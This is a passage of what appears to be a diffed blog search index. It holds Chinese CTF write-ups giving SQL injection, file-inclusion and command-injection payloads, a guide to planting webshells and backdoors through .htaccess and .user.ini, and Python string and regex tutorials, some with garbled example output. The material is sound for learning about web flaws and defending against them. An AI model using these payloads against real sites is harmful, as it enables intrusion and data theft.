+<p>1919810931114514必须用反单引号括起来，但是words不需要，我也不知道为什么,向大佬求解</p>
+<p>这个表中发现字段flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142029194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>之前不是通过 order by查询是有两个字段吗 ,可以猜测到现在sql语句查询的是word这个表里面的数据</p>
+<p>接下来就是用各种膜拜大佬们的wp,下面这个是很骚的解法</p>
+<h2 id="解法一-改名"><a class="header-anchor" href="#解法一-改名">¶</a>解法一:改名</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1&#39; or 1&#x3D;1#爆出表所有内容就可以查flag啦</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改表名:RENAME TABLE &lt;旧表名&gt; TO &lt;新表名&gt;;</span><br><span class="line">修改字段名:alter table &lt;表名&gt; change &lt;字段名&gt; &lt;字段新名称&gt; &lt;字段的类型&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(50);#</span><br></pre></td></tr></table></figure>
+<p>然后 <code>1' or 1=1 #</code> 爆出flag</p>
+<h2 id="解法二-预处理语句-堆叠注入"><a class="header-anchor" href="#解法二-预处理语句-堆叠注入">¶</a>解法二:预处理语句+堆叠注入</h2>
+<p>先了解预处理语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用</span><br><span class="line">EXECUTE ：执行命令</span><br><span class="line">DEALLOCATE PREPARE：释放命令</span><br></pre></td></tr></table></figure>
+<p>测试</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142049172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<p>参考:<a href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
+<h1>[极客大挑战 2019]EasySQL</h1>
+<p>测试得到是单引号闭合</p>
+<p>万能密码就能爆出flag</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h1>[极客大挑战 2019]Havefun</h1>
+<p>查看源码,发现代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
+<h1>[SUCTF 2019]EasySQL</h1>
+<p>尝试看看 查询当前数据库名</p>
+<p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
+<p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
+<p>输入 *,1 尝试 直接读出来了。。。。。估计是非预期</p>
+<p>接着我尝试堆叠注入  <code>1;show tables;</code> 发现flag这个表,再去读的时候发现过滤了 from。。。不会了 看看大佬的wp吧</p>
+<p>内置的sql语句为<code>sql =&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</code></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>
+PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<p>将sql_mode设置为PIPES_AS_CONCAT的话，||就不再是逻辑or了，而变成了字符串连接符。<br>
+因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
+<p>本地测试一下:</p>
+<p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
+<h1>[ACTF2020 新生赛]Include</h1>
+<p>打开题目 tips</p>
+<p>发现地址栏有个file参数 明显的文件包含</p>
+<p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h1>[极客大挑战 2019]Secret File</h1>
+<p>打开题目右键查看源码</p>
+<p>发现 Archi ve_room.php</p>
+<p>然后 点进去源码又发现action.php</p>
+<p>然后会重定向到 end.php</p>
+<p>bp抓包 发现 secr3t.php  发现源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>伪协议读取得到flag</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h1>[极客大挑战 2019]LoveSQL</h1>
+<p>打开题目 order by发现字段为3</p>
+<p>查表: 有两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114165135624.png" alt="在这里插入图片描述"></p>
+<p>查表 l0ve1ysq1 的列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114165050773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查数据得到flag  但是我竟然蠢到用 limit 读取。。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,password from &#96;l0ve1ysq1&#96; limit 15,1%23</span><br></pre></td></tr></table></figure>
+<p>可以用 group_concat</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
+<h1>[GXYCTF2019]Ping Ping Ping</h1>
+<p>打开题目发现是rce</p>
+<p>尝试读取:  没有过滤分号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114234736150.png" alt="在这里插入图片描述"></p>
+<p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>buuctf</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>.htaccess和.user.ini文件的妙用</title>
+    <url>/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="htaccess"><a class="header-anchor" href="#htaccess">¶</a>.htaccess</h2>
+<p>httpd-conf是Apache的系统配置文件，一个全局的配置文件，对整个web服务起作用；而.htaccess也是Apache的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</p>
+<h3 id="实例"><a class="header-anchor" href="#实例">¶</a>实例</h3>
+<p>在绕过文件上传的限制中，通常在Apache全局配置文件httpd.conf中有这样一条配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021011615060595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这条配置的意思就是将.php、.phtml文件后缀的文件当做php文件执行，如果开启了这条配置，就可以上传.phtml文件在执行php代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php文件后缀。</p>
+<p>或者这条配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+<p>将所有文件都解析为php文件。</p>
+<p>通常全局文件我们都是不可更改的，而Apache还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的web目录起作用，例如：我们在www目录下有一个.htaccess配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将jpg文件当做PHP文件解析。这样就可以直接解析jpg后缀的webshell。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问1.jpg，当做PHP解析。</p>
+<h3 id="局限"><a class="header-anchor" href="#局限">¶</a>局限</h3>
+<p>.htaccess配置文件只在Apache服务器中起作用。</p>
+<h2 id="user-ini"><a class="header-anchor" href="#user-ini">¶</a>.user.ini</h2>
+<p>那么什么是.user.ini？</p>
+<p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">php.net/manual/zh/i…</a> 这几种模式有什么区别？看看官方的解释：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151405369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER['DOCUMENT_ROOT']</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
+<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
+<p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151430962.png" alt="在这里插入图片描述"></p>
+<p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210116151450360.png" alt="在这里插入图片描述"></p>
+<p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.png</span><br></pre></td></tr></table></figure>
+<p>总结:</p>
+<p><strong>在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</strong></p>
+<h3 id="实例-v2"><a class="header-anchor" href="#实例-v2">¶</a>实例</h3>
+<p>利用php上文配置项中有两个配置可以起到一些作用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头</span><br><span class="line">auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210116150859202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210116150752148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>这两个配置项的作用相当于一个文件包含，比如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; .user.ini</span><br><span class="line">auto_prepend_file &#x3D; 1.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 11.php</span><br></pre></td></tr></table></figure>
+<p>也就是在一个目录下有.user.ini这个配置文件，配置内容为上，有1.jpg，同时该目录下还需要有.php后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php文件包含1.jpg这个图片，在此处相当于在11.php文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>
+另一条配置包含在文件尾，如果遇到了exit语句的话就会失效。</p>
+<p>.user.ini使用范围很广，不仅限于Apache服务器，同样适用于Nginx服务器，只要服务器启用了fastcgi模式(通常非线程安全模式使用的就是fastcgi模式)。</p>
+<h3 id="局限-v2"><a class="header-anchor" href="#局限-v2">¶</a>局限</h3>
+<p>在.user.ini中使用这条配置的使用也说了是在同目录下的其他.php文件中包含配置中所指定的文件，也就是说需要该目录下存在.php文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p>
+<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p>
+<p>参考:</p>
+<p><a href="https://www.cnblogs.com/hmbb/p/9689436.html">https://www.cnblogs.com/hmbb/p/9689436.html</a></p>
+<p><a href="https://juejin.cn/post/6844903571876478989">https://juejin.cn/post/6844903571876478989</a></p>
+<p><a href="https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/?__cf_chl_jschl_tk__=2cc2c77a0da33ccfc56eb3d9d0ea524d3c052fa3-1610779227-0-AbdcQTwDwFTtyRxD4ZY9TMgaOri_RcrcEmmOfmDlKaPz3yZF6prJ5XcRuaawDlwh7Faf_dlnJpvgZ6R3T_SEJYvKp1E6FQQaQlDWVyqBnlTEhsMuhW7qujE2Y-tueBJGFNmXRCMSBcnJipEevNYliZqR3UySscVfQ4pS68uI7Uo99pdsTpn7pZfCuoAQuYKiEw9ZNCDRO3X_NrYJof0l60g617IUgy_8024ZMHG3OutwuXQ3K2LPBvQNIHNAGWCh1NnJXwqfHamlTKilXoZuEakmlcPZDqhk_SrZuw78HW3UCOOLrexW9pSh0PEIRUIaUOFH5DlkEY2IMCNlIJjrpaU">user.ini</a></p>
+<p>​</p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件上传</category>
       </categories>
   </entry>
   <entry>
@@ -906,6 +967,146 @@ payload: cat flag.php||</p>
       <categories>
         <category>web技术学习</category>
         <category>php伪随机数漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python之字符串前面加u,r,f的含义</title>
+    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
+    <content><![CDATA[<p>版本 python3.6及以上</p>
+<a id="more"></a>
+<p><strong>1.u:表示unicode字符串</strong><br>
+字符串中存在中文的字符，在前面加上u</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; u&#39;这是一个中文的字符串。&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>2.r:表示非转义的原始字符串</strong><br>
+字符串中存在\，要让它失效，要在前面加上r</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  print(r&#39;今天是七夕节,\n但是还是要加班！&#39;) #加上r就是\不转义</span><br><span class="line">  今天是七夕节,\n但是还是要加班！</span><br><span class="line">  </span><br><span class="line">print(&#39;今天是七夕节,\t但是还是要加班！&#39;)  #不加上r就是\转义</span><br><span class="line">今天是七夕节,	但是还是要加班！</span><br></pre></td></tr></table></figure>
+<p><strong>3.f:表示在字符串内支持大括号内的python 表达式</strong></p>
+<p>f-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。（目前支持python3.6版本）</p>
+<p>下面看下 f-strings 的使用方法</p>
+<p>基本使用（作用：替换值）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;name &#x3D; &#39;hoxis&#39;</span><br><span class="line">&gt;&gt;&gt; age &#x3D; 18</span><br><span class="line">&gt;&gt;&gt; f&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">#结果如下</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br><span class="line">&gt;&gt;&gt; F&quot;hi, &#123;name&#125;, are you &#123;age&#125;&quot;</span><br><span class="line">&#39;hi, hoxis, are you 18&#39;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python正则表达式和re库</title>
+    <url>/2021/01/04/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%92%8Cre%E5%BA%93/</url>
+    <content><![CDATA[<p>正确使用正则表达式能省很多功夫</p>
+<a id="more"></a>
+<h2 id="1、正则表达式的语法"><a class="header-anchor" href="#1、正则表达式的语法">¶</a>1、正则表达式的语法</h2>
+<ul>
+<li>. 表示任何单个字符</li>
+<li>[] 字符集，对单个字符给出取值范围</li>
+<li>[^] 非字符集，对单个字符给出排除范围</li>
+<li>*前一个字符0次或者无限次扩展</li>
+<li>+前一个字符1次或无限次扩展</li>
+<li>?前一个字符0次或1次扩展</li>
+<li>|左右表达式任意一个</li>
+<li>{m}扩展前一个字符m次</li>
+<li>{m,n}扩展前一个字符m至n次</li>
+<li>^匹配字符串开头</li>
+<li>$匹配字符串结尾</li>
+<li>()分组标记，内部只能使用|操作符</li>
+<li>\d数字，等价于[0-9]</li>
+<li>\w单词字符，等价于[A-Z,a-z,0-9]</li>
+</ul>
+<h2 id="2、python中re库的使用"><a class="header-anchor" href="#2、python中re库的使用">¶</a>2、python中re库的使用</h2>
+<blockquote>
+<p>Re库是python的标准库，主要用于字符串匹配，调用方法：import re</p>
+</blockquote>
+<h3 id="2-1、正则表达式字符串的类型"><a class="header-anchor" href="#2-1、正则表达式字符串的类型">¶</a>2.1、正则表达式字符串的类型</h3>
+<p>re库采用raw string类型来表示正则表达式，表示为<br>
+<strong>r’text’</strong><br>
+raw string是不包含对转义符的再次转义的字符串，总而言就是string会对字符转义，而raw string不会，因为在正则表达中会出现转义符号，所以避免繁琐我们使用raw string</p>
+<h3 id="2-2、Re库主要功能函数"><a class="header-anchor" href="#2-2、Re库主要功能函数">¶</a>2.2、Re库主要功能函数</h3>
+<ul>
+<li><strong>re.search</strong>()在一个字符串中搜索正则表达式的第一个位置，返回match对象</li>
+<li>**re.match()**从一个字符串的开始位置起匹配正则表达式，返回match对象</li>
+<li>**re.findall()**搜索字符串，以列表类型返回全部能匹配的子串</li>
+<li>**re.split()**将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</li>
+<li>**re.finditer()**搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</li>
+<li>**re.sub()**在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</li>
+</ul>
+<h4 id="2-2-1、re-search-pattern-string-flags-0"><a class="header-anchor" href="#2-2-1、re-search-pattern-string-flags-0">¶</a>2.2.1、re.search(pattern, string, flags=0)</h4>
+<p>在一个字符串中搜索正则表达式的第一个位置，返回match对象</p>
+<ul>
+<li>pattern : 正则表达式的字符串或原生字符串表示</li>
+<li>string : 待匹配字符串</li>
+<li>flags : 正则表达式使用时的控制标记</li>
+<li>re.I re.IGNORECASE 忽略正则表达式的大小写，[A‐Z]能够匹配小写字符</li>
+<li>re.M re.MULTILINE 正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</li>
+<li>re.S re.DOTALL 正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</li>
+</ul>
+<p>举例说明：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果为<span class="number">100081123456</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-2、re-match-pattern-string-flags-0"><a class="header-anchor" href="#2-2-2、re-match-pattern-string-flags-0">¶</a>2.2.2、re.match(pattern, string, flags=0)</h3>
+<p>从一个字符串的开始位置起匹配正则表达式，返回match对象<br>
+参数同search函数<br>
+举例说明：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">match = re.match(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line">print(match.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">结果会报错，match为空，因为match函数是</span><br><span class="line">从字符串开始位置开始匹配，因为从开始位置没有匹配到，所以为空<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-3、re-findall-pattern-string-flags-0"><a class="header-anchor" href="#2-2-3、re-findall-pattern-string-flags-0">¶</a>2.2.3、re.findall(pattern, string, flags=0)</h3>
+<p>搜索字符串，以列表类型返回全部能匹配的子串<br>
+参数同search<br>
+举例说明:</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ls=re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">print(ls)</span><br><span class="line"></span><br><span class="line">结果为[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-4、re-split-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-4、re-split-pattern-string-maxsplit-0-flags-0">¶</a>2.2.4、re.split(pattern, string, maxsplit=0, flags=0)</h3>
+<p>将一个字符串按照正则表达式匹配结果进行分割返回列表类型</p>
+<ul>
+<li>maxsplit : 最大分割数，剩余部分作为最后一个元素输出<br>
+举例说明 ：</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27; &#x27;</span>]</span><br><span class="line">re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">结果[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100081&#x27;</span>]<span class="number">12345</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0"><a class="header-anchor" href="#2-2-5、re-finditer-pattern-string-maxsplit-0-flags-0">¶</a>2.2.5、re.finditer(pattern, string, maxsplit=0, flags=0)</h3>
+<p>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象<br>
+参数同search<br>
+举例说明 :</p>
